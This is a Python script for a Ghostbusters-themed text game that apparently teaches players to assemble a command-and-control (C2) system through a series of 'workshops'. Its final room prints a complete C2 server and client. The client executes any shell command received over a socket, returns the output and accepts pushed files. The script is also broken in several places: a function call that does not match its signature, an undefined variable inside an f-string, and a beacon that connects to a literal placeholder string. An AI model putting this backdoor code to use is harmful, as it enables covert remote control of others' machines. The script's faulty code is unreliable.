import socket
import time
import subprocess
import os

# Initialize game variables
assembled_components = {}

# Function Definitions
# (Note: These are placeholders. Replace them with the actual functions you've created in the workshops.)
def server_setup_workshop():
    print("Welcome to the Server Setup Workshop. Don't cross the streams!")
    print("Just like Egon said, 'Don't cross the streams,' we say, 'Don't mix up your IPs and ports!'")
    
    # Get IP and port from the player
    server_ip = input("Enter the server IP address, because we 'ain't afraid of no ghost' or IP! ")
    server_port = int(input("Enter the server port. Choose wisely, just like you would when picking a proton pack: "))
    
    # Display the code to initialize a server
    print("""
    # Server Setup Code (For Training Purposes Only)
    import socket
    
    server_ip = '{}'
    server_port = {}
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((server_ip, server_port))
        s.listen()
        print(f'Server successfully set up on IP: {{server_ip}} and Port: {{server_port}}')
    """.format(server_ip, server_port))

    print("Server successfully set up. As Peter Venkman would say, 'We came, we saw, we kicked its...!'")

    return server_ip, server_port
    pass

def client_setup_workshop():
    print("Welcome to the Client Setup Workshop. As Janine would say, 'We got one!'")
    print("Just like capturing ghosts, setting up a client requires precision and the right tools.")
    
    # Get server IP and port from the player
    server_ip = input("Enter the server IP address you'll be connecting to. Don't worry, there are no ghosts there: ")
    server_port = int(input("Enter the server port. As Ray would say, 'This is a new house; it's clean, it's all clear!' "))
    
    # Display the code to initialize a client
    print(f"""
    # Client Setup Code (For Training Purposes Only)
    import socket
    
    server_ip = '{server_ip}'
    server_port = {server_port}
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        print(f'Successfully connected to the server on IP: {{server_ip}} and Port: {{server_port}}')
    """)

    print("Client successfully set up. You're a true Ghostbuster!")

    return server_ip, server_port
    pass

def beacon_workshop():
    print("Welcome to the Beacon Workshop. As Ray Parker Jr. sang, 'I ain't afraid of no ghost!'")
    print("Beacons are like the PKE Meters of cybersecurity—detecting and communicating without drawing attention.")
    
    # Get beacon interval from the player
    beacon_interval = int(input("Enter the beacon interval in seconds. Just like the Gh0stbust3rz need to time their traps, timing is key here: "))
    
    # Display the code to implement a simple beacon
    print(f"""
    # Beacon Code (For Training Purposes Only)
    import time
    import socket
    
    beacon_interval = {beacon_interval}
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        while True:
            s.connect(('server_ip', server_port))
            print(f'Beacon sent at interval: {{beacon_interval}} seconds')
            time.sleep(beacon_interval)
    """)

    print("Beacon set up successfully. You're turning into a Cybersecurity Ghostbuster!")

    return beacon_interval
    pass

def file_transfer_workshop():
    print("Welcome to the File Transfer Workshop. Or as Peter Venkman would say, 'He slimed me!'")
    print("Just like the Gh0stbust3rz collect samples of ectoplasm, you'll be transferring files!")
    
    # Get the file name from the player
    file_name = input("Enter the name of the file you'd like to transfer. Think of it as capturing a ghost in a trap: ")
    
    # Display the code for file transfer
    print(f"""
    # File Transfer Code (For Training Purposes Only)
    import socket
    
    file_name = '{file_name}'
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('server_ip', server_port))
        with open(file_name, 'rb') as f:
            file_data = f.read()
            s.sendall(file_data)
        print(f'File {{file_name}} successfully transferred.')
    """)

    print("File transfer successful! You're definitely a member of the Gh0stbust3rz now!")

    return file_name
    pass

def script_execution_workshop():
    print("Welcome to the Script Execution Workshop. As Winston Zeddemore said, 'This job is definitely not worth eleven-five a year!'")
    print("Well, in cybersecurity, executing scripts properly could make it worth a lot more than that!")
    
    # Get the script name from the player
    script_name = input("Enter the name of the script you'd like to execute. Think of it as choosing the right Gh0stbust3rz gadget: ")
    
    # Display the code for script execution
    print(f"""
    # Script Execution Code (For Training Purposes Only)
    import subprocess
    
    script_name = '{script_name}'
    
    output = subprocess.run([script_name], capture_output=True, text=True)
    print(f'Script {{script_name}} executed with output: {{output.stdout}}')
    """)

    print("Script executed successfully! You're mastering the Gh0stbust3rz' level of expertise!")

    return script_name

def command_execution_workshop():
    print("Welcome to the Command Execution Workshop. As the famous Gh0stbust3rz tagline goes, 'Who you gonna call?'")
    print("In the world of cybersecurity, sometimes you have to call (or execute) specific commands!")
    
    # Get the command from the player
    command = input("Enter the shell command you'd like to execute. It's like selecting the correct frequency on your Ecto Goggles: ")
    
    # Display the code for command execution
    print(f"""
    # Command Execution Code (For Training Purposes Only)
    import subprocess
    
    command = '{command}'
    
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(f'Command {{command}} executed with output: {{output.stdout}}')
    """)

    print("Command executed successfully! You're officially ready to take on Gozer... or at least some cybersecurity challenges!")

    return command
    pass

# Final Assembly Room: "Who you gonna call? Gh0stbust3rz!"

def final_assembly_room(server_ip, server_port, beacon_interval, file_name, script_name, command):
    print("Welcome to the Final Assembly Room. Or as the Gh0stbust3rz would say, 'This is it! This is definitely it!'")
    print("It's time to assemble a basic server and client script to assist in your ghost busting.")

    # Display the complete server script
    print("----- Server Script -----")
    print(f"""
    # Gh0stbust3rz C2 Server Script
    import socket
    import threading

    def handle_file_transfer(conn, filename):
        with open(filename, 'rb') as file:
            conn.sendall(file.read())

    def client_handler(conn):
        while True:
            command = input('Enter command or "file:<filename>" to send a file: ')
            if command.lower().startswith('file:'):
                filename = command.split(':', 1)[1]
                handle_file_transfer(conn, filename)
            else:
                conn.sendall(command.encode())
                if command.lower() == 'exit':
                    conn.close()
                    break
                data = conn.recv(1024)
                print(data.decode())

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 9999))
    server_socket.listen(5)
    print('Server is listening...')

    while True:
        conn, addr = server_socket.accept()
        print(f'Connected to {addr}')
        threading.Thread(target=client_handler, args=(conn,)).start()
        """)

        # Display the complete client script
        print("----- Client Script -----")
        print(f"""
        # Gh0stbust3rz C2 Client Script
        import socket
        import subprocess

        def receive_file(conn, filename):
            with open(filename, 'wb') as file:
                data = conn.recv(1024)
                while data:
                    file.write(data)
                    data = conn.recv(1024)

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('localhost', 9999))

        while True:
            command = client_socket.recv(1024).decode()
            if command.lower().startswith('file:'):
                filename = command.split(':', 1)[1]
                receive_file(client_socket, filename)
            elif command.lower() == 'exit':
                client_socket.close()
                break
            else:
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = result.stdout.decode() + result.stderr.decode()
                client_socket.sendall(output.encode())
    """)

    print("You've successfully assembled both the server and client scripts! You are a Ghostbuster-level cybersecurity expert now!")

    pass


# Introduction
print("Who ya gonna call? CyberGh0stbust3rz!")
print("Your mission is to assemble the virtual components for a server-client architecture.")
print("In this educational journey, you'll navigate through various workshops to build a Command and Control (C2) system, Gh0stbust3rz style!\n")

while True:
    print("You're in the Gh0stbust3rz Firehouse. Where do you want to go?")
    print("1. Server Setup Workshop - 'Don't cross the streams!'")
    print("2. Client Setup Workshop - 'We got one!'")
    print("3. Beacon Workshop - 'I ain't afraid of no ghost.'")
    print("4. File Transfer Workshop - 'He slimed me.'")
    print("5. Script Execution Workshop - 'This job is definitely not worth eleven-five a year!'")
    print("6. Command Execution Workshop - 'Back off, man. I'm a scientist.'")
    print("7. Final Assembly Room - 'Time to show this prehistoric b... how we do things downtown!'")
    print("8. Exit - 'We came, we saw, we kicked its...!'")

    choice = input("Your choice: ")

    if choice == "1":
        assembled_components['server'] = server_setup_workshop()
    elif choice == "2":
        assembled_components['client'] = client_setup_workshop()
    elif choice == "3":
        assembled_components['beacon'] = beacon_workshop()
    elif choice == "4":
        assembled_components['file_transfer'] = file_transfer_workshop()
    elif choice == "5":
        assembled_components['script_execution'] = script_execution_workshop()
    elif choice == "6":
        assembled_components['command_execution'] = command_execution_workshop()
    elif choice == "7":
        final_assembly_room(assembled_components)
    elif choice == "8":
        print("Exiting the game. Goodbye!")
        break
    else:
        print("Invalid choice. Try again.")
